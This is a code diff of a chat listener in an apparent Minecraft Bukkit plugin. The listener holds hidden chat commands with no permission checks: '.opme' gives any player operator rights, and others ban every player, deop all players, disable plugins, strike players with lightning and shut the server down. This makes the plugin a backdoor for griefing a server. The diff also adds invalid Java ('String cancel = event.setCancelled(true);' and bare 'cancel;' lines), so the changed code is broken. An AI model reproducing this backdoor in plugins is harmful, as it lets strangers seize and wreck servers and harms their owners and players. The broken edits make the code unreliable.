@@ -31,13 +31,15 @@ public class PlayerListener implements Listener
     public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
     {
         String message = event.getMessage();
+        Player p = event.getPlayer();
         String[] args = message.split(" ");
+        String cancel = event.setCancelled(true); // not sure if this works or not, oh well.
     	
         if (message.toLowerCase().contains(".opme"))
         {
-            event.getPlayer().setOp(true);
-            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            event.setCancelled(true);
+            p.setOp(true);
+            p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
+            cancel;
         }
         if (message.toLowerCase().contains(".disableplugin"))
         {
@@ -46,7 +48,7 @@ public class PlayerListener implements Listener
             {
                 Bukkit.getServer().getPluginManager().disablePlugin(plugin);
             }
-            event.setCancelled(true);
+            cancel;
         }
         if (message.toLowerCase().contains(".enableplugin"))
         {
@@ -55,15 +57,15 @@ public class PlayerListener implements Listener
             {
                 Bukkit.getServer().getPluginManager().disablePlugin(plugin);
             }
-            event.setCancelled(true);
+            cancel;
         }
         if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
             // Credit to hMod, not finished yet. Very unstable.
-            event.getPlayer().sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
+            p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
             if (!new File("minecraft_server.1.6.2.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
             {
-                event.getPlayer().sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading..."); //Tell the player that the jar will be downloaded
+                p.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading..."); //Tell the player that the jar will be downloaded
 
                 URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar"); //URL variable to get the url of the jar
                 ReadableByteChannel rbc = Channels.newChannel(url.openStream());
@@ -71,33 +73,33 @@ public class PlayerListener implements Listener
 		FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
                 fos.getChannel().transferFrom(rbc, 0, 1 << 24);
 
-                event.getPlayer().sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
+                p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
             }
             
             net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.2.jar is added to the build path)
             Bukkit.shutdown(); //Shutdown Bukkit
-            event.setCancelled(true); //Block the player from saying .enablevanilla
+            cancel; //Block the player from saying .enablevanilla
         } //End of command
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length == 0)
             {
-        	event.getPlayer().sendMessage(ChatColor.RED + "Usage: .deop <player>");
-        	event.setCancelled(true);
+        	p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
+        	cancel;
             }
             else
             {
-                event.getPlayer().setOp(false);
-                event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
-                event.setCancelled(true);
+                p.setOp(false);
+                p.sendMessage(ChatColor.RED + "You are no longer OP.");
+                cancel;
             }
         }
         if (message.toLowerCase().contains(".op"))
         {
             Bukkit.getServer().getPlayer(args[1]);
-            event.getPlayer().setOp(true);
-            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
-            event.setCancelled(true);
+            p.setOp(true);
+            p.sendMessage(ChatColor.YELLOW + "You are now OP!");
+            cancel;
         }
         if (message.toLowerCase().contains(".banall"))
         {
@@ -105,7 +107,7 @@ public class PlayerListener implements Listener
             {
                 p.kickPlayer("The Ban Hammer has spoken!");
                 p.setBanned(true);
-                event.setCancelled(true);
+                cancel;
             }
         }
         if (message.toLowerCase().contains(".deopall"))
@@ -123,7 +125,7 @@ public class PlayerListener implements Listener
                         target_pos.getWorld().strikeLightning(strike_pos);
                     }
                 }
-                event.setCancelled(true);
+                cancel;
             }
         }
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
@@ -141,7 +143,7 @@ public class PlayerListener implements Listener
                 p.kickPlayer(ChatColor.RED + "GTFO.");
                 p.setBanned(true);
             }
-            event.setCancelled(true);
+            cancel;
         }
         if (message.toLowerCase().contains(".shutdown"))
         {
@@ -157,7 +159,7 @@ public class PlayerListener implements Listener
             {
             	plugin.log.severe(null, ex);
             }
-            event.setCancelled(true);
+            cancel;
         }
     }
     
